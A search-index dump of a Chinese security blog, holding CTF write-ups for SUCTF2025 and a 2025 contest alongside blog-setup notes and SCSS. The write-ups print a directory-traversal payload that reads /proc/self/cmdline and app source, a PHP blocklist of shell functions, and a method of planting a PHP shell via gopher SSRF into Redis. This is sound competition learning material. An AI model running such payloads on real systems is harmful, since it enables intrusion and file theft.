None def main(): # Known prefix of the password prefix = \"SePassWordLen23SUCTF\" # Total length of the password length = 23 # Character set to use for the missing characters (alphanumeric) charset = string.ascii_letters + string.digits # Ciphertext to decrypt ciphertext = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" # Start brute-forcing password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset) if password: print(f\"Success! Password: {password}\") print(f\"Decrypted text: {decrypted_text}\") if __name__ == \"__main__\": main() ","date":"2025-01-14","objectID":"/posts/48766ef/:2:1","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_RealCheckin\rhello ctf -\u003e 🏠🦅🍋🍋🍊 🐈🌮🍟 $flag -\u003e 🐍☂️🐈🌮🍟{🐋🦅🍋🐈🍊🏔️🦅_🌮🍊_🐍☂️🐈🌮🍟_🧶🍊☂️_🐈🍎🌃_🌈🦅🍎🍋🍋🧶_🐬🍎🌃🐈🦅} $flag 前五个为suctf，根据映射关系最后大括号里面的推断出来是 ? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e 其实第一段很明显是welcome，可以发现该emoji代表的东西的英文首字母就是该emoji代表的字符，故最后flag为 suctf{welcome_to_suctf_you_can_really_dance} ","date":"2025-01-14","objectID":"/posts/48766ef/:2:2","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Web\r","date":"2025-01-14","objectID":"/posts/48766ef/:3:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_blog\rarticles 目录有目录穿越，读启动命令，双写绕过一下 article?file=articles/....//....//....//....//....//....//proc/self/cmdline 拿到pythonapp/app.py，拿源码 article?file=articles/....//....//app/app.py 源码 from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_friendlink(index): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) if 0 \u003c= index \u003c len(friend_links): del friend_links[index] return redirect(url_for('friendlinks')) @app.route('/article') def article(): if 'username' not in session: return redirect(url_for('login')) file_name = request.args.get('file', '') if not file_name: return render_template('article.html', file_name='', content=\"未提供文件名。\") blacklist = [\"waf.py\"] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template('article.html', file_name=file_name, content=\"大黑阔不许看\") if not file_name.startswith('articles/'): return render_template('article.html', file_name=file_name, content=\"无效的文件路径。\") if file_name not in articles.values(): if session.get('username') != 'admin': return render_template('article.html', file_name=file_name, content=\"无权访问该文件。\") file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace('../', '') try: with open(file_path, 'r', encoding='ut","date":"2025-01-14","objectID":"/posts/48766ef/:3:1","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_photogallery\r404页面 参考 [FSCTF 2023]签到plus 尝试打下 php＜= 7 . 4 . 21 development server源码泄露，其实随便访问一下就出源码了 unzip.php \u003c?php error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_FILES['file']) \u0026\u0026 $_FILES['file']['error'] === UPLOAD_ERR_OK) { $uploadedFile = $_FILES['file']; $zipname = $uploadedFile['tmp_name']; $path = $uploadDir; $result = unzip($zipname, $path); if ($result === true) { header(\"Location: index.html?status=success\"); exit(); } else { header(\"Loca","date":"2025-01-14","objectID":"/posts/48766ef/:3:2","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"前言\r比赛时间有点阴间，题目的话全是二进制，能看的题就只有三道，Java听说是个1day，摆了 ","date":"2025-01-07","objectID":"/posts/6c39531/:1:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"钓鱼邮件\r记事本打开是一大串base64编码，解码后是个zip，下载下来爆破密码，最后密码为 20001111，得到个exe，拿到奇安信在线沙箱出 尝试后发现是222.218.218.218那个，md5一下就行 ","date":"2025-01-07","objectID":"/posts/6c39531/:2:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"CachedVisitor\rmain.lua local function read_file(filename) local file = io.open(filename, \"r\") if not file then print(\"Error: Could not open file \" .. filename) return nil end local content = file:read(\"*a\") file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\"##LUA_START##(.-)##LUA_END##\") if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\"Error executing Lua code: \", result) end else print(\"Error loading Lua code: \", err) end else print(\"Error: No valid Lua code block found.\") end end local function main() local filename = \"/scripts/visit.script\" local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() 最后是执行了一个文件，而/scripts/visit.script的作用是从外部 URL 获取数据并将其缓存到 Redis 中，一个很明显的ssrf打redis，刚开始走偏了，以为是打个cve 可以直接把/scripts/visit.script覆盖成执行/readflag并获取回显，用dict协议老是会报引号有问题，用gopher协议打 这里选择的是phpshell，默认生成的是shell.php，解码改一下文件名和长度 最后编码的话还是建议用bp直接编码，其他的总会出点问题 接下来是二进制爷的wp ","date":"2025-01-07","objectID":"/posts/6c39531/:3:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"donntyousee\r打开文件逐步调试 这里面是call-ret型花指令，所以把相关内容nop掉，大致格式是： push rax; call loop; loop: xxxxx; ret; pop rax; 每个相关的函数都有这个，可以全部nop掉 调用了这两个函数，分别都是call r8，只有动态调试 第一个是执行Sbox的初始化，用的数据是byte_5C5110，这个是key 第二个函数是执行加密，很明显是一个魔改RC4，可以直接逆向。 继续往后调试 这里进行了比较，sub_4E4060是输出正确与否，所以看v7的终值，直接解密即可 key:921C2B1FBAFBA2FF07697D77188C data:25 cd 54 af 51 1c 58 d3 a8 4b 4f 56 ec 83 5d d4 f6 47 4a 6f e0 73 b0 a5 a8 c3 17 81 5e 2b f4 f6 71 ea 2f ff a8 63 99 57 flag:dart{y0UD0ntL4cKg0oD3y34T0F1nDTh3B4aUtY} ","date":"2025-01-07","objectID":"/posts/6c39531/:4:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["杂记"],"content":"前置\r下载好Git、Go 和 Dart Sass、hugo Dart Sass我这用的npm下的 npm install -g sass sass --version //验证安装 hugo下载：https://github.com/gohugoio/hugo/releases（下载extend拓展版的，方便自定义加东西，记得加环境变量） 其他我都配好了，不多说 ","date":"2025-01-06","objectID":"/posts/5c6225e/:1:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"博客配置\r然后按照这个来吧： https://fixit.lruihao.cn/zh-cn/documentation/getting-started/quick-start/ 这里echo时要去掉双引号，其他的不多说 ","date":"2025-01-06","objectID":"/posts/5c6225e/:2:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"美化记录（持续更新ing）\r","date":"2025-01-06","objectID":"/posts/5c6225e/:3:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"2025.2.28\r有人催我加友链，于是弄下友链，感觉 loveit 主题和 fixit 主题差不多，按照文章：https://blog.233so.com/2020/04/friend-link-shortcodes-for-hugo-loveit/ 来就好，只需要注意下在修改FixIt/assets/css/_page/的_single.scss时引入的行应该为 @import \"../_partials/_single/friend\"; fixit 的目录比 loveit 的目录少了个 s ，其他的话叫 ai 改了个颜色，把旋转去掉了，再加了个微微放大的动画，我的 friend.scss // ===== 变量定义 ===== $shadow-green: rgba(50, 205, 50, 0.3); // 绿色阴影 $hover-green: rgba(144, 238, 144, 0.3); // 悬停背景色 $hover-scale: 1.02; // 悬停放大比例 $transition-time: 0.3s; // 过渡动画时间 // ===== 基础样式 ===== .friendurl { text-decoration: none !important; color: black; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%; border: 1px solid #ddd; padding: 2px; box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.15); margin: 14px 0 0 14px !important; background-color: #fff; } .frienddiv { // ===== 布局属性 ===== height: 92px; margin-top: 10px; width: 48%; display: inline-block !important; border-radius: 5px; // ===== 视觉效果 ===== background: rgba(255, 255, 255, 0.2); box-shadow: 4px 4px 2px 1px $shadow-green; // ===== 过渡动画 ===== transition: all $transition-time ease-in-out; // ===== 悬停状态 ===== \u0026:hover { background: $hover-green; transform: scale($hover-scale); box-shadow: 4px 4px 6px 2px rgba(50, 205, 50, 0.25); // 加强阴影 } // ===== 左侧头像区域 ===== .frienddivleft { width: 92px; float: left; margin-right: 2px; } // ===== 右侧文字区域 ===== .frienddivright { margin-top: 18px; margin-right: 18px; } // ===== 文字控制 ===== .friendname, .friendinfo { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; } } // ===== 手机端适配 ===== @media screen and (max-width: 600px) { .frienddiv { width: 100% !important; // 单列显示 \u0026:hover { transform: scale(1.01); // 缩小放大比例 } .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 14px; } } } ","date":"2025-01-06","objectID":"/posts/5c6225e/:3:1","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":null,"content":"Introduction👨‍💻\rWeb/Misc@D0g3 想学渗透，想学Java ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Contact me☎️\rQQ：Mjg2OTg3Mzk1OQ== Github：https://github.com/6s6-630 ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"D0g3\rgaorenyusi\rWeb\rYuy0ung\rWeb\u0026Misc\rfupanc\rWeb\rVVkladg0\rWeb\rtammy66\rWeb\rLitsasuk\rWeb\rpRism\rRe\r","date":"0001-01-01","objectID":"/links/:0:1","tags":null,"title":"Links","uri":"/links/"}]